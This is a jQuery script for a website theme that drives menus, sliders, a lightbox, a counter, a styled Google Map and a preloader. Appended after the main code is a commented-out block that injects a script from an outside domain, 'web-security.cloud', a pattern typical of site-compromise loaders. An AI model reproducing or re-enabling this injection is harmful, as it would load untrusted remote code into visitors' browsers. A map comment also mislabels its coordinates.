jQuery(function ($) {

	'use strict';


    // -------------------------------------------------------------
    //      Sticky Menu
    // -------------------------------------------------------------
        
        (function () {
            var nav = $('.navbar');
            var scrolled = false;

            $(window).scroll(function () {

                if (110 < $(window).scrollTop() && !scrolled) {
                    nav.addClass('sticky animated fadeInDown').animate({ 'margin-top': '0px' });

                    scrolled = true;
                }

                if (110 > $(window).scrollTop() && scrolled) {
                    nav.removeClass('sticky animated fadeInDown').css('margin-top', '0px');

                    scrolled = false;
                }


                var winTop = $(window).scrollTop();
                
                if (winTop >= 30) {
                    $(".homePageFive").addClass("sticky-header");
                } else {
                    $(".homePageFive").removeClass("sticky-header");
                }
            });
        }());



    // -------------------------------------------------------------
    //  	Offcanvas Menu
    // -------------------------------------------------------------

        (function () {
            var menutoggle = $(".menu-toggle");
            var offcanvasmenu = $("#offcanvas-menu");
            var closemenu = $(".close-menu");

            menutoggle.on("click" ,function(){
                offcanvasmenu.addClass("toggled");
                return false;
            });

            closemenu.on("click" ,function() {
                offcanvasmenu.removeClass("toggled");
                return false;
            });
        }());



    // -------------------------------------------------------------
    //      Single-Page-Menu-Scrolling  Easy Plugin
    // -------------------------------------------------------------

        $(function() {
            $('a.page-scroll').on('click', function(event) {
                var $anchor = $(this);
                $('html, body').stop().animate({
                    scrollTop: $($anchor.attr('href')).offset().top
                }, 1500, 'easeInOutExpo');
                event.preventDefault();
            });
        });


    // -------------------------------------------------------------
    // Sub-menu
    // -------------------------------------------------------------
        if ( $('.dropmenu').length) {
            $('.dropmenu').on("click" ,function(){
                $(this).parent().find('ul').slideToggle();
                return false;
            });
        }



    // -------------------------------------------------------------
    //      Search Bar
    // -------------------------------------------------------------

        (function () {
            var openbar = $(".open-bar");
            var searchbar = $("#search-bar");
            var closebar = $(".close-bar");

            openbar.on("click" ,function(){
                searchbar.addClass("active");
                return false;
            });

            closebar.on("click" ,function() {
                searchbar.removeClass("active");
                return false;
            });
        }());



    // -------------------------------------------------------------
    //      Login-Box 
    // -------------------------------------------------------------

        $(document).ready(function(){
            var submitIcon = $('#login');
            var submitInput = $('.sb-search-input');
            var searchBox = $('#login');
            var isOpen = false;
            
            $(document).mouseup(function(){
                if(isOpen == true){
                submitInput.val('');
                $('.sb-search-submit').css('z-index','-999');
                submitIcon.click();
                }
            });
            
            submitIcon.mouseup(function(){
                return false;
            });
            
            searchBox.mouseup(function(){
                return false;
            });
                    
            submitIcon.on("click" , function(){
                if(isOpen == false){
                    searchBox.addClass('active');
                    isOpen = true;
                } else {
                    searchBox.removeClass('active');
                    isOpen = false;
                }
            });
        });




    // -------------------------------------------------------------
    //      Panorama-View-Js
    // -------------------------------------------------------------

        if ($('.panorama-view').length) {
            $('.panorama-view').spritespin({
                source: './assets/images/panorama.jpg',
                // this sets the width of the display. The panorama image must be larger
                width: 600,
                height: 300,
                // select the modules
                mods: [
                    // change frame on mouse drag
                    'drag',
                    // enable the easing module. this will ease out the animation
                    // after mouse release, instead of a hard stop
                    'ease',
                    // the panorama display module
                    'panorama'
                ]
            });
        }

    

    // -------------------------------------------------------------
    //      LightBox-Js
    // -------------------------------------------------------------

        if ($('#lightBox').length) {
            $('#lightBox').poptrox({
                usePopupCaption: true,
                usePopupNav: true,
                popupPadding: 0
            });
        }



    // ------------------------------------------------------------------
    //      Revulation Slider
    // ------------------------------------------------------------------

        if ($('.tp-banner').length) {
            $('.tp-banner').revolution({
                delay:9000,
                startwidth:1170,
                startheight:850,
                hideThumbs:10,
                fullWidth:"on",
                forceFullWidth:"on",
                onHoverStop:"off",
                navigationType:"none",
                navigationStyle:"preview4",
                spinner:"off",
                hideTimerBar:"on"
            });
        }
       
   


    // -------------------------------------------------------------
    //      instagram-Slider
    // -------------------------------------------------------------

        if ($('.instagram-carousel').length) {
            $('.instagram-carousel').owlCarousel({
                loop:true,
                autoplay:true,
                autoplayTimeout: 3000,
                margin:30,
                nav:true,
                responsive:{
                    0:{
                        items:1,
                        nav:false,
                        dots:false,
                    },
                    600:{
                        items:3,
                        nav:false,
                        dots:false,
                    },
                    1000:{
                        items:7
                    }
                }
            });
        }




    // -------------------------------------------------------------
    //      Subject-Slider
    // -------------------------------------------------------------

        if ($('.subject-carousel').length) {
            $('.subject-carousel').owlCarousel({
                loop:true,
                autoplay:true,
                margin:30,
                nav:false,
                dot:true,
                responsive:{
                    0:{
                        items:1,
                        nav:false,
                        dots:true,
                    },
                    600:{
                        items:2,
                        nav:false,
                        dots:true,
                    },
                    1000:{
                        items:3
                    }
                }
            });
        }




    //-------------------------------------------------------
    //  	counter Section
    //-------------------------------------------------------
       
        function funFactCounting() {
            if ($('.counting-section').length) {
                $('.counting-section').on('inview', function(event, visible, visiblePartX, visiblePartY) {
                    if (visible) {
                        $(this).find('.timer').each(function () {
                            var $this = $(this);
                            $({ Counter: 0 }).animate({ Counter: $this.text() }, {
                                duration: 2000,
                                easing: 'linear',
                                step: function () {
                                    $this.text(Math.ceil(this.Counter));
                                }
                            });
                        });

                        $(this).off('inview');
                    }
                });
            }
        }




    // -------------------------------------------------------------
    //      Google Map
    // -------------------------------------------------------------

        if ($('#googleMap').length) {
            google.maps.event.addDomListener(window, 'load', init);
            
            function init() {
                var mapOptions = {
                    // How zoomed in you want the map to start at (always required)
                    zoom: 15,
                    scrollwheel: false,

                    // The latitude and longitude to center the map (always required)
                    center: new google.maps.LatLng(36.169941, -115.139830), // New York

                    // This is where you would paste any style found on Snazzy Maps.
                    styles:[{"featureType": "all","elementType": "labels.text.fill","stylers": [{"saturation": 36},{"color": "#333333"},{"lightness": 40}]},
                            {"featureType": "all","elementType": "labels.text.stroke","stylers": [{"visibility": "on"},{"color": "#ffffff"},{"lightness": 16}]},
                            {"featureType": "all","elementType": "labels.icon","stylers": [{"visibility": "off"}]},
                            {"featureType": "administrative","elementType": "geometry.fill","stylers": [{"color": "#fefefe"},{"lightness": 20}]},
                            {"featureType": "administrative","elementType": "geometry.stroke","stylers": [{"color": "#fefefe"},{"lightness": 17},{"weight": 1.2}]},
                            {"featureType": "landscape","elementType": "geometry","stylers": [{"color": "#f5f5f5"},{"lightness": 20}]},
                            {"featureType": "poi","elementType": "geometry","stylers": [{"color": "#f5f5f5"},{"lightness": 21}]},
                            {"featureType": "poi.park","elementType": "geometry","stylers": [{"color": "#dedede"},{"lightness": 21}]},
                            {"featureType": "road.highway","elementType": "geometry.fill","stylers": [{"color": "#ffffff"},{"lightness": 17}]},
                            {"featureType": "road.highway","elementType": "geometry.stroke","stylers": [{"color": "#ffffff"},{"lightness": 29},{"weight": 0.2}]},
                            {"featureType": "road.arterial","elementType": "geometry","stylers": [{"color": "#ffffff"},{"lightness": 18}]},
                            {"featureType": "road.local","elementType": "geometry","stylers": [{"color": "#ffffff"},{"lightness": 16}]},
                            {"featureType": "transit","elementType": "geometry","stylers": [{"color": "#f2f2f2"},{"lightness": 19}]},
                            {"featureType": "water","elementType": "geometry","stylers": [{"color": "#e9e9e9"},{"lightness": 17}]}]};

                            // Get the HTML DOM element that will contain your map 
                            var mapElement = document.getElementById('googleMap');

                            // Create the Google Map using our element and options defined above
                            var map = new google.maps.Map(mapElement, mapOptions);

                            // Let's also add a marker while we're at it
                            var marker = new google.maps.Marker({
                                position: new google.maps.LatLng(36.169941, -115.139830),
                                map: map,
                                title: 'Snazzy!'
                            });
            }
        }




    // -------------------------------------------------------------
    // Back To Top
    // -------------------------------------------------------------

        function backToTopBtnAppear() {
            if ($("#toTop").length) {
                var windowpos = $(window).scrollTop(),
                    backToTopBtn = $("#toTop");

                if (windowpos > 300) {
                    backToTopBtn.fadeIn();
                } else {
                   backToTopBtn.fadeOut();
                }
            }
        }

        function backToTop() {
            if ($("#toTop").length) {
                var backToTopBtn = $("#toTop");
                backToTopBtn.on("click", function() {
                    $("html, body").animate({
                        scrollTop: 0
                    }, 1000);
                    
                    return false;
                })
            }
        }



	// -------------------------------------------------------------
    // 		Preloader
    // -------------------------------------------------------------

        function preloader() {
            if ($('#preloader').length) {
                $('#preloader').delay(100).fadeOut('slow' , function () {
                    new WOW().init();
                });
            }
        }



    // -------------------------------------------------------------
    //      WHEN WINDOW LOAD
    // -------------------------------------------------------------

        $(window).on("load", function() {

            preloader();

            new WOW().init();

            funFactCounting();

            backToTop();

        })



    // -------------------------------------------------------------
    //      WHEN WINDOW SCROLL
    // -------------------------------------------------------------
        $(window).on("scroll", function() {

            backToTopBtnAppear();

        });

});   // Jquery-End
/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/